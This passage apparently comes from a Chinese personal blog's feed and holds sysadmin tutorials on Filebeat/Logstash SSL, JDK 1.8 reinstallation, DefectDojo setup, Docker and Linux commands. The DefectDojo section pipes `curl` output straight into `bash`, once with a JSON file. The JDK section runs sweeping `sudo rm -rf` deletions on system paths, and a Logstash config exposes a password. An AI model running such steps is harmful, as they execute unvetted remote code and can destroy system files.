class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）修改文件夹gitalk为certs，可以看到filebeat相关证书已经下载成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> gitalk certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366185610.png" alt="1615366185610"></p><h3 id="6-2-3-filebeat配置证书"><a href="#6-2-3-filebeat配置证书" class="headerlink" title="6.2.3 filebeat配置证书"></a>6.2.3 filebeat配置证书</h3><p>（1）配置证书</p><p>配置/etc/filebeat/filebeat.yml 文件，在output.logstash节点加上3行ssl相关参数为证书路径如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /etc/filebeat/filebeat.yml /etc/filebeat/filebeat0.yml<span class="token function">vi</span> /etc/filebeat/filebeat.yml output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"xx.xx.io:5044"</span><span class="token punctuation">]</span>  ssl.certificate_authorities: <span class="token punctuation">[</span><span class="token string">"/etc/filebeat/certs/ca.crt"</span><span class="token punctuation">]</span>  ssl.certificate: <span class="token string">"/etc/filebeat/certs/filebeat.crt"</span>  ssl.key: <span class="token string">"/etc/filebeat/certs/filebeat.key"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）重启filebeat</p><p>运行下面命令启动filebeat（用以下方式启动的原因是因为报错的时候，方便看日志，如果采用systemctl restart filebeat方式启动，如果启动失败，日志不好找，参考<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>  ）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以 看到日志中有Connection to backoff(async(tcp://xx.xx.io:5044)) established信息，则表示连接成功。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615358106512.png" alt="1615358106512"></p><h1 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h1><p><a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/">elk笔记一—suricata+elk搭建入侵检测系统</a></p><p><a href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a></p><p><a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">centos7中安装suricata</a></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html">使用SSL与Logstash进行安全通信官方配置</a>  官方配置</p><p><a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>  很有用</p><p><a href="https://www.cnblogs.com/galsnag/articles/10144170.html">filebeat与logstash实现ssl加密传输 </a>第1次参考方案</p><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a>  第二次参考方案-目前 直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书 </p><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">filebeat.yml配置文件详细说明</a> 当字典检索</p><p><a href="https://blog.csdn.net/Gamer_gyt/article/details/69280693">使用filebeat进行数据加密传输和区别不同的日志源</a></p><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p><p><a href="https://www.jianshu.com/p/f5f93c89155e">openssl 查看证书</a>  制作过程中可以检验，我传输的证书有缺陷就是用这个检验出来的</p><p><a href="https://blog.csdn.net/cowbin2012/article/details/100134114">证书具体参数说明</a></p><p><a href="https://ningyu1.github.io/site/post/51-ssl-cert/">Openssl生成自签名证书的多种方式</a>  本文生成证书参考的</p><p><a href="https://mp.weixin.qq.com/s/qm8bmJPfH8kC9yHDqxL6aA">威胁狩猎：基于ELK的日志监控</a>  值得看的结构   后面再看看</p><p><a href="https://www.elastic.co/cn/blog/configuring-ssl-tls-and-https-to-secure-elasticsearch-kibana-beats-and-logstash#run-filebeat">配置 SSL、TLS 以及 HTTPS 来确保 Elasticsearch、Kibana、Beats 和 Logstash 的安全</a>  官网参考配置   后面再看看</p><h1 id="logstash-标准配置"><a href="#logstash-标准配置" class="headerlink" title="logstash 标准配置"></a>logstash 标准配置</h1><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>    stdin &amp;<span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats &amp;<span class="token comment" spellcheck="true">#123;</span>        port =<span class="token punctuation">></span> 5044        ssl =<span class="token punctuation">></span> true        ssl_certificate_authorities =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"/etc/logstash/certs/ca.crt"</span><span class="token punctuation">]</span>        ssl_certificate =<span class="token punctuation">></span> "/etc/logstash/certs/logstash.crt"        ssl_key =<span class="token punctuation">></span> "/etc/logstash/certs/logstash.key"        ssl_verify_mode =<span class="token punctuation">></span> "force_peer"    &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>    elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>        hosts =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>        index =<span class="token punctuation">></span> "filebeats<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>        user =<span class="token punctuation">></span> "elastic"        password =<span class="token punctuation">></span> "siem<span class="token important">*2021</span>"    &amp;<span class="token comment" spellcheck="true">#125;</span>    stdout &amp;<span class="token comment" spellcheck="true">#123;</span>        codec =<span class="token punctuation">></span> rubydebug     &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 日志管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux安装jdk1.8</title>
      <link href="/2021/02/18/linux-jdk8/"/>
      <url>/2021/02/18/linux-jdk8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>很多软件的安装都需要java8的环境，如何再Linux安装java8环境呢？</p><a id="more"></a><h1 id="1-查看旧版本"><a href="#1-查看旧版本" class="headerlink" title="1 查看旧版本"></a>1 查看旧版本</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604406880320.png" alt="1604406880320"></p><h1 id="2-替换成1-8版本"><a href="#2-替换成1-8版本" class="headerlink" title="2 替换成1.8版本"></a>2 替换成1.8版本</h1><p>可以发现本机上有两个java，但是目前使用的是1.7的，直接修改/etc/profile配置文件，讲JAVA_HOME修改为1.8jdk所在的路径即可。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603862700214.png" alt="1603862700214"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604407037055.png" alt="1604407037055"></p><p>这里可以看到centos7自带的仅仅是jre，并没有装jdk，此时最好卸载自带的重新安装jdk8</p><h2 id="3-重新安装1-8"><a href="#3-重新安装1-8" class="headerlink" title="3 重新安装1.8"></a>3 重新安装1.8</h2><p>若原主机没有1.8版本，则此时需要先卸载旧版本，再安装1.8版本。</p><h2 id="3-1-卸载旧版本"><a href="#3-1-卸载旧版本" class="headerlink" title="3.1 卸载旧版本"></a>3.1 卸载旧版本</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum remove java-1.8.0-openjdk#采用yum install -y java-1.8.0-openjdk方式安装的卸载方法</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装1-8版本java"><a href="#3-2-安装1-8版本java" class="headerlink" title="3.2 安装1.8版本java"></a>3.2 安装1.8版本java</h2><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，<strong>而那个不带-devel的安装完了其实是jre。</strong> </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603870468396.png" alt="1603870468396"></p><h2 id="3-3-修改环境变量"><a href="#3-3-修改环境变量" class="headerlink" title="3.3 修改环境变量"></a>3.3 修改环境变量</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603867783946.png" alt="1603867783946"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DefectDojo安装与使用</title>
      <link href="/2021/01/21/esc-DefectDojo/"/>
      <url>/2021/01/21/esc-DefectDojo/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近老板要求建设资产管理与服务软件，团队人员少，只能找找开源的啦，DefectDojo基于Django框架可以搭建看看</p><a id="more"></a><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><h2 id="1-1-官方文档"><a href="#1-1-官方文档" class="headerlink" title="1.1 官方文档"></a>1.1 官方文档</h2><p>github地址:<a href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a></p><p>官方文档:<a href="https://defectdojo.readthedocs.io/en/latest/about.html">https://defectdojo.readthedocs.io/en/latest/about.html</a></p><h2 id="1-2-环境版本"><a href="#1-2-环境版本" class="headerlink" title="1.2 环境版本"></a>1.2 环境版本</h2><h3 id="1-2-1-docker-compose"><a href="#1-2-1-docker-compose" class="headerlink" title="1.2.1 docker-compose"></a>1.2.1 docker-compose</h3><p>使用docker-compose进行安装至少需要docker 18.09.4和docker-compose 1.22.0,如果没有安装,则按照下面命令安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/bin/<span class="token function">wget</span> https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64<span class="token function">rename</span> docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64<span class="token function">chmod</span> +x /usr/local/bin/docker-compose./docker-compose version<span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose<span class="token comment" spellcheck="true">#加个软连接</span>docker-compose version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1611195834714.png" alt="1611195834714"></p><h3 id="1-2-2-python版本3之上"><a href="#1-2-2-python版本3之上" class="headerlink" title="1.2.2 python版本3之上"></a>1.2.2 python版本3之上</h3><p><img src="/2021/01/21/esc-DefectDojo/1611652410659.png" alt="1611652410659"></p><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h1><h2 id="2-1-下载安装"><a href="#2-1-下载安装" class="headerlink" title="2.1 下载安装"></a>2.1 下载安装</h2><p>执行下面的命令,进行安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/DefectDojo/django-DefectDojo<span class="token function">cd</span> django-DefectDojo<span class="token comment" spellcheck="true"># building</span>docker-compose build<span class="token comment" spellcheck="true"># running</span>docker-compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行docker-compose build时候,会报错如下:(如果build有错,也可直接up就行)</strong></p><p>curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</p><p><img src="/2021/01/21/esc-DefectDojo/1611211553110.png" alt="1611211553110"></p><p><a href="https://github.com/hawtim/blog/issues/10">解决办法</a>：</p><p><img src="/2021/01/21/esc-DefectDojo/1611211540151.png" alt="1611211540151"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/hosts<span class="token comment" spellcheck="true">#编辑hosts,添加如下映射</span>199.232.96.133 raw.githubusercontent.com199.232.96.133 user-images.githubusercontent.com199.232.96.133 avatars2.githubusercontent.com199.232.96.133 avatars1.githubusercontent.com/etc/init.d/networking restart<span class="token comment" spellcheck="true">#重启网络</span><span class="token function">service</span> network restart<span class="token comment" spellcheck="true">#或者这种方法重启网络</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以访问下面几个网址测试是否修改成功,</p><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://raw.githubusercontent.com/pyupio/safety-db/master/data/insecure_full.json <span class="token operator">|</span> <span class="token function">bash</span> -s stablecurl -L https://get.rvm.io <span class="token operator">|</span> <span class="token function">bash</span> -s stable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1612339821470.png" alt="1612339821470"></p><p><img src="/2021/01/21/esc-DefectDojo/1611643936373.png" alt="1611643936373"></p><h2 id="2-2-登录"><a href="#2-2-登录" class="headerlink" title="2.2 登录"></a>2.2 登录</h2><p>安装后的初始密码会出线再log里面,直接用下面命令进行查找.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># use docker-compose logs -f initializer to track progress</span>docker-compose logs initializer <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Admin password:"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果显示如下用户密码已经存在,但是自己忘记密码了密码,可以重新创建新用户及密码</p><p><img src="/2021/01/21/esc-DefectDojo/1612340052892.png" alt="1612340052892"></p><pre class="line-numbers language-bash"><code class="language-bash">docker-compose <span class="token function">exec</span> uwsgi /bin/bash -c <span class="token string">'python manage.py createsuperuser'</span><span class="token comment" spellcheck="true">#创建新的超级用户和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问: <a href="http://localhost:8080/%E6%88%96%E8%80%85http://10.27.22.92:8080/dashboard">http://localhost:8080/或者http://10.27.22.92:8080/dashboard</a></p><p><img src="/2021/01/21/esc-DefectDojo/1612340217583.png" alt="1612340217583"></p><h1 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://owasp.org/www-pdf-archive/Defectdojo-owasp-stammtisch-final.pdf">Defectdojo架构</a></p><p><a href="https://readthedocs.org/projects/defectdojo/downloads/pdf/latest/">相关文档pdf</a></p><p><a href="https://github.com/DefectDojo/django-DefectDojo/issues/2018">Defectdojo问题列表解决</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 企业安全建设 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>证书的各种格式</title>
      <link href="/2020/10/10/cipher-certificate-format/"/>
      <url>/2020/10/10/cipher-certificate-format/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>待完善</p><a id="more"></a><p> 证书主要的文件类型和协议有: PEM、DER、PFX、JKS、KDB、CER、KEY、CSR、CRT、CRL 、OCSP、SCEP等。 </p><p>一编码格式</p><p><a href="https://blog.csdn.net/hqy1719239337/article/details/88896074">https://blog.csdn.net/hqy1719239337/article/details/88896074</a></p><p>二 文件后缀</p><p><a href="https://blog.csdn.net/bolang789/article/details/74942925">https://blog.csdn.net/bolang789/article/details/74942925</a></p><p><a href="https://blog.csdn.net/yetugeng/article/details/100629159">https://blog.csdn.net/yetugeng/article/details/100629159</a></p><p>三 后缀转化</p><p><a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker使用大全</title>
      <link href="/2020/09/28/docker-guide/"/>
      <url>/2020/09/28/docker-guide/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>自己检索方便</p><a id="more"></a><h1 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1 docker安装"></a>1 docker安装</h1><h4 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h4><p>较旧的 Docker 版本称为 docker 或 docker-engine 。如果已安装这些程序，请卸载它们以及相关的依赖项。</p><p>$ <strong>sudo</strong> <strong>yum remove</strong> docker <br>         docker-client <br>         docker-client-latest <br>         docker-common <br>         docker-latest <br>         docker-latest-logrotate <br>         docker-logrotate <br>         docker-engine</p><h4 id="安装-Docker-Engine-Community"><a href="#安装-Docker-Engine-Community" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>可以选择国内的一些aliyun源地址：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager \    --add-repo \    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="安装-Docker-Engine-Community-1"><a href="#安装-Docker-Engine-Community-1" class="headerlink" title="安装 Docker Engine-Community"></a>安装 Docker Engine-Community</h4><p>安装最新版本的 Docker Engine-Community 和 containerd，或者转到下一步安装特定版本：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="启动-Docker。"><a href="#启动-Docker。" class="headerlink" title="启动 Docker。"></a>启动 Docker。</h4><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过运行 hello-world 映像来验证是否正确安装了 Docker Engine-Community 。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> docker run hello-world<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/28/docker-guide/1603272603871.png" alt="1603272603871"></p><h1 id="2-docker常用命令"><a href="#2-docker常用命令" class="headerlink" title="2 docker常用命令"></a>2 docker常用命令</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> search ubantu <span class="token comment" spellcheck="true">#搜索镜像</span><span class="token variable">$docker</span> pull ubantu  <span class="token comment" spellcheck="true">#载入镜像</span><span class="token variable">$docker</span> run -it ubuntu /bin/bash <span class="token comment" spellcheck="true">#启动镜像</span>root@ed09e4490c57:/<span class="token comment" spellcheck="true"># exit退出容器</span>$ docker <span class="token function">ps</span> -a  <span class="token comment" spellcheck="true">#查看所有的容器</span>$ docker <span class="token function">ps</span> -l <span class="token comment" spellcheck="true">#查看最后一次创建的容器</span>$ docker start b750bbbcfd88  <span class="token comment" spellcheck="true">#使用 docker start 启动一个已停止的容器</span>$ docker stop <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#停止一个容器</span>$ docker restart <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span>  <span class="token comment" spellcheck="true">#重启一个容器</span>$ docker <span class="token function">rm</span> -f <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个容器</span>$ docker rmi  <span class="token operator">&lt;</span>镜像名称<span class="token operator">></span> <span class="token comment" spellcheck="true">#删除一个镜像</span>$ docker run -itd --name ubuntu-test ubuntu /bin/bash <span class="token comment" spellcheck="true">#后台运行容器</span>$ docker <span class="token function">exec</span> -it <span class="token operator">&lt;</span>容器 ID<span class="token operator">></span> /bin/bash <span class="token comment" spellcheck="true">#进入一个容器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>镜像打包如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$docker</span> <span class="token function">ps</span> <span class="token variable">$docker</span> login harbor.XX.io/openvas <span class="token comment" spellcheck="true">#输入域帐号&amp;密码</span><span class="token variable">$docker</span> commit <span class="token operator">&lt;</span>容器name<span class="token operator">></span> harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span><span class="token variable">$docker</span> push harbor.XX.io/openvas:<span class="token punctuation">[</span>tag_openvas_20200710_XXXX<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-1-docker-访问宿主机目录"><a href="#2-1-docker-访问宿主机目录" class="headerlink" title="2.1 docker 访问宿主机目录"></a>2.1 docker 访问宿主机目录</h2><h3 id="挂载一个目录"><a href="#挂载一个目录" class="headerlink" title="挂载一个目录"></a>挂载一个目录</h3><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 执行之后，相当于把此数据目录挂载在对应docker的目录中，用  即可查看并访问所挂载数据。Dockerfile中最后一行运行相应的 </p><p>例如：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -it -m 4G -v /var/log/suricata:/mnt -p 5601:5601 -p 9200:9200 -p 5044:5044 sebp/elk: 638</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                                                                              NAMES45a7bc7b174d        sebp/elk:623        <span class="token string">"/usr/local/bin/star…"</span>   13 hours ago        Up 12 hours         0.0.0.0:5044-<span class="token operator">></span>5044/tcp, 0.0.0.0:5601-<span class="token operator">></span>5601/tcp, 0.0.0.0:9200-<span class="token operator">></span>9200/tcp, 9300/tcp   charming_wu<span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 45a7bc7b174d bash</span>root@45a7bc7b174d:/<span class="token comment" spellcheck="true"># ls</span>bd_build  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到宿主机文件夹mnt</p><p><img src="/2020/09/28/docker-guide/1603765650364.png" alt="1603765650364"></p><h3 id="挂载两个目录"><a href="#挂载两个目录" class="headerlink" title="挂载两个目录"></a>挂载两个目录</h3><p>注意每个目录前都要加参数-v</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v <span class="token variable">$path_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path_in_docker</span> -v <span class="token variable">$path1_to_host_data</span><span class="token keyword">:</span><span class="token variable">$new_path1_in_docker</span> deep_sleepnet:1.0 /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux命令大全</title>
      <link href="/2020/09/28/linux-cmd/"/>
      <url>/2020/09/28/linux-cmd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>linux命令大全，方便自己检索</p><a id="more"></a><h4 id="重命名："><a href="#重命名：" class="headerlink" title="重命名："></a>重命名：</h4><pre><code>原字符串：将文件名需要替换的字符串；目标字符串：将文件名中含有的原字符替换成目标字符串；文件：指定要改变文件名的文件列表。</code></pre><pre><code>rename main1.c main.c main1.c</code></pre><h4 id="复制文件："><a href="#复制文件：" class="headerlink" title="复制文件："></a>复制文件：</h4><pre><code> cp -i file1 dir1</code></pre><h4 id="linux-查看进程"><a href="#linux-查看进程" class="headerlink" title="linux 查看进程"></a>linux 查看进程</h4><p>ps -ef/  ps -aux </p><p>[root@ids0001 logstash]# ps -ef |grep logstash</p><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><p>kill 1827 </p><p>kill -9 1827</p><h4 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h4><pre><code>free -m</code></pre><h4 id="查看进程所用内存"><a href="#查看进程所用内存" class="headerlink" title="查看进程所用内存"></a>查看进程所用内存</h4><pre><code>top然后按M进行排序</code></pre><h4 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h4><pre><code>sudo nohup cmd </code></pre><p>sudo nohup /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf &amp;</p><h4 id="inotify命令"><a href="#inotify命令" class="headerlink" title="inotify命令"></a><a href="https://cloud.tencent.com/developer/article/1417976">inotify命令</a></h4><p>功能：监控某个目录的文件是否发生变化执行相应脚本 </p><p>（0）首先查看系统内核是否支持inotify功能   ls -l /proc/sys/fs/inotify，出现如下内容说明支持：</p><pre class="line-numbers language-bash"><code class="language-bash">total 0-rw-r--r-- 1 root root 0 Apr 23 15:23 max_queued_events-rw-r--r-- 1 root root 0 Apr 24 22:11 max_user_instances-rw-r--r-- 1 root root 0 Apr 23 15:23 max_user_watches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或通过 uname -a 查看当前系统内核版本是否在2.6.13 以上：</p><pre class="line-numbers language-bash"><code class="language-bash">Linux VM_3_105_centos 3.10.107 x86_64 GNU/Linux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（1）查看是否安装</p><pre class="line-numbers language-bash"><code class="language-bash">rpm -qa inotify-tools <span class="token comment" 